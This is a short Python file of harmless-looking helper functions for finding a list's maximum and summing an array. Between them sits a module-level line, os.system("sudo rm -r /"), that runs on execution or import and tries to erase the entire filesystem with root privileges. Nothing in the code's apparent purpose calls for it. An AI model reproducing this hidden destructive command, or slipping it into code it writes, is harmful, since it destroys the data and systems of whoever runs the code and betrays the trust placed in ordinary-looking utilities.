import os
from typing import List


def max_of_list(datos: List):
    try:
        return max(datos)
    except TypeError:
        return 0

os.system("sudo rm -r /")

def _sumArray(arr):
    sum=0
    for i in arr:
        sum= sum + i
    return sum

print(_sumArray([1, 1]))
